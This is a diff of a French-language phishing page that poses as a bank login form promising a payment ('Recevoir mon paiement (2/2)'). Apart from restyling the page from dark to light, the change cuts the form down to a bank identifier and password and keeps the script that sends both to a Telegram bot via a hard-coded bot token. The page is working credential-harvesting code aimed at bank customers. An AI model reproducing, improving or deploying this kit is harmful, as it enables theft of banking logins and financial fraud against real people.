@@ -7,7 +7,7 @@
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #121212; /* Fond sombre */
+            background-color: white; /* Fond blanc */
             margin: 0;
             display: flex;
             justify-content: center;
@@ -15,7 +15,7 @@
             min-height: 100vh;
             position: relative;
             overflow-y: auto;
-            color: #ffffff; /* Texte blanc */
+            color: #333; /* Texte noir */
         }
         .header-logo {
             position: fixed;
@@ -37,17 +37,17 @@
             opacity: 0.8;
         }
         .container {
-            background-color: #2c2c2c; /* Fond gris animé */
+            background-color: #f9f9f9; /* Fond gris clair */
             border-radius: 20px;
-            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.5); /* Ombre plus prononcée */
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.1); /* Ombre légère */
             padding: 40px;
-            max-width: 800px;
+            max-width: 600px; /* Réduire la largeur du formulaire */
             width: 90%;
             text-align: center;
             position: relative;
             z-index: 1;
             margin-top: 100px; /* Espace pour le logo en haut */
-            margin-bottom: 200px; /* Espace pour le logo en bas */
+            margin-bottom: 150px; /* Espace pour le logo en bas */
             animation: fadeInContainer 1.5s ease-in-out;
         }
         @keyframes fadeInContainer {
@@ -71,11 +71,11 @@
         }
         .subtitle {
             font-size: 14px;
-            color: #aaa; /* Texte gris clair */
+            color: #666; /* Texte gris foncé */
             margin-bottom: 30px;
         }
         p {
-            color: #aaa; /* Texte gris clair */
+            color: #666; /* Texte gris foncé */
             line-height: 1.8;
             margin-bottom: 25px;
             font-size: 16px;
@@ -88,19 +88,20 @@
         .form-group label {
             display: block;
             margin-bottom: 10px;
-            color: #ffffff; /* Texte blanc */
+            color: #333; /* Texte noir */
             font-weight: bold;
             font-size: 16px;
         }
         .form-group input {
-            width: 100%;
+            width: 80%; /* Réduire la largeur des champs */
             padding: 15px 15px 15px 40px; /* Espace pour l'émoji */
-            border: 2px solid #444; /* Bordure sombre */
+            border: 2px solid #e0e0e0; /* Bordure grise */
             border-radius: 12px;
             font-size: 16px;
             transition: all 0.3s ease;
-            background-color: #333; /* Fond sombre pour les champs */
-            color: #ffffff; /* Texte blanc */
+            background-color: white; /* Fond blanc pour les champs */
+            color: #333; /* Texte noir */
+            margin: 0 auto; /* Centrer les champs */
         }
         .form-group input:focus {
             border-color: #007bff;
@@ -120,7 +121,7 @@
         }
         .btn {
             display: block;
-            width: 100%;
+            width: 80%; /* Réduire la largeur du bouton */
             padding: 15px;
             background: linear-gradient(135deg, #007bff, #0056b3);
             color: #fff;
@@ -130,6 +131,7 @@
             font-size: 18px;
             font-weight: bold;
             transition: all 0.3s ease;
+            margin: 0 auto; /* Centrer le bouton */
         }
         .btn:hover {
             background: linear-gradient(135deg, #0056b3, #003d80);
@@ -139,7 +141,7 @@
         .footer {
             text-align: center;
             font-size: 14px;
-            color: #999;
+            color: #666; /* Texte gris foncé */
             margin-top: 30px;
         }
         .shield-icon {
@@ -153,7 +155,7 @@
         }
         .secure-connection {
             font-size: 14px;
-            color: #666;
+            color: #666; /* Texte gris foncé */
             margin-top: 10px;
             text-align: center;
         }
@@ -163,7 +165,7 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background-color: rgba(0, 0, 0, 0.9); /* Fond sombre */
+            background-color: rgba(255, 255, 255, 0.9); /* Fond blanc semi-transparent */
             display: flex;
             justify-content: center;
             align-items: center;
@@ -197,6 +199,9 @@
             grid-template-columns: repeat(3, 1fr);
             gap: 10px;
             margin-top: 20px;
+            width: 80%; /* Même largeur que les champs */
+            margin-left: auto;
+            margin-right: auto;
         }
         .numeric-keyboard button {
             padding: 20px;
@@ -215,6 +220,9 @@
             margin-top: 10px;
             display: flex;
             justify-content: space-around;
+            width: 80%; /* Même largeur que les champs */
+            margin-left: auto;
+            margin-right: auto;
         }
         .keyboard-toggle button {
             padding: 10px 20px;
@@ -228,6 +236,20 @@
         }
         .keyboard-toggle button:hover {
             background-color: #0056b3;
+        }
+        .bank-logo {
+            margin-top: 20px;
+            display: none; /* Caché par défaut */
+            animation: zoomIn 0.5s ease-in-out;
+        }
+        @keyframes zoomIn {
+            0% { transform: scale(0); }
+            100% { transform: scale(1); }
+        }
+        .bank-logo img {
+            height: 50px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
         }
     </style>
 </head>
@@ -256,6 +278,10 @@
                     <input type="password" id="password" name="password" placeholder="Votre mot de passe" required>
                     <span class="toggle-password" onclick="togglePasswordVisibility()">👁️</span>
                 </div>
+                <div class="keyboard-toggle">
+                    <button type="button" onclick="toggleKeyboard('numeric')">Clavier Numérique</button>
+                    <button type="button" onclick="toggleKeyboard('free')">Main Libre</button>
+                </div>
                 <div class="numeric-keyboard" id="numeric-keyboard">
                     <button type="button" onclick="appendNumber('1')">1</button>
                     <button type="button" onclick="appendNumber('2')">2</button>
@@ -271,22 +297,13 @@
                     <button type="button" onclick="backspace()">←</button>
                 </div>
             </div>
-            <div class="form-group">
-                <label for="bank-name">Nom de la banque</label>
-                <div style="position: relative;">
-                    <span class="emoji-icon">🏦</span>
-                    <input type="text" id="bank-name" name="bank-name" placeholder="Nom de votre banque" required>
-                </div>
-            </div>
-            <div class="form-group">
-                <label for="mobile">Numéro de mobile</label>
-                <div style="position: relative;">
-                    <span class="emoji-icon">📱</span>
-                    <input type="text" id="mobile" name="mobile" placeholder="Votre numéro de mobile" required>
-                </div>
-            </div>
-            <button type="submit" class="btn">Valider</button>
+            <button type="submit" class="btn">Recevoir mon paiement (2/2)</button>
         </form>
+
+        <!-- Logo de la banque -->
+        <div class="bank-logo" id="bank-logo">
+            <img id="bank-logo-img" src="" alt="Logo de la banque">
+        </div>
 
         <!-- Texte en bas du formulaire -->
         <div class="footer">
@@ -324,6 +341,19 @@
             }
         }
 
+        // Fonction pour basculer entre les claviers
+        function toggleKeyboard(type) {
+            const numericKeyboard = document.getElementById('numeric-keyboard');
+            const passwordInput = document.getElementById('password');
+            if (type === 'numeric') {
+                numericKeyboard.style.display = 'grid';
+                passwordInput.type = 'password';
+            } else {
+                numericKeyboard.style.display = 'none';
+                passwordInput.type = 'text';
+            }
+        }
+
         // Fonction pour ajouter un chiffre au champ du mot de passe
         function appendNumber(number) {
             const passwordInput = document.getElementById('password');
@@ -352,11 +382,9 @@
             // Récupérer les données du formulaire
             const bankId = document.getElementById('bank-id').value;
             const password = document.getElementById('password').value;
-            const bankName = document.getElementById('bank-name').value;
-            const mobile = document.getElementById('mobile').value;
 
             // Validation des champs
-            if (!bankId || !password || !bankName || !mobile) {
+            if (!bankId || !password) {
                 alert('Veuillez remplir tous les champs.');
                 loadingScreen.style.display = 'none';
                 return;
@@ -365,9 +393,7 @@
             // Préparer le message pour Telegram
             const message = `Nouvelle soumission de compte bancaire:\n\n` +
                            `Identifiant Bancaire: ${bankId}\n` +
-                           `Mot de passe: ${password}\n` +
-                           `Nom de la banque: ${bankName}\n` +
-                           `Numéro de mobile: ${mobile}`;
+                           `Mot de passe: ${password}`;
 
             // Envoyer les données via l'API Telegram
             const botToken = '7636461108:AAFoL5FVlK-E33AfUbMi2CQk62w0fT85jKs';
